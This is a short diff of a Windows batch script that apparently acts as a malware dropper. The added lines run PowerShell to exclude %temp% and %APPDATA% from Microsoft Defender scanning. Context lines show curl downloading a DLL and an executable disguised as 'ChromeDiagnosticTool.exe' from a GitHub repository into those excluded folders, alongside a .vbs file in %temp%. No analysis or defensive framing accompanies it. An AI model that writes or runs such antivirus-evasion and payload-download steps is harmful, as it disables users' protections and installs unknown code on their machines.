@@ -1,7 +1,8 @@
 @echo off
 
-Add-MpPreference -ExculisonPath "%temp%"
-Add-MpPreference -ExculisonPath "%APPDATA%"
+powershell -c Add-MpPreference -ExclusionPath "%temp%"
+powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
+
 
 :: Dosya yollarını tanımlayalım
 set "FILE1=%temp%\ddd.vbs"
@@ -27,6 +28,7 @@ curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert.dll
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/ChromeDiagnosticTool.exe" -o "%FILE7%"
 
 exit
+
 
 
 
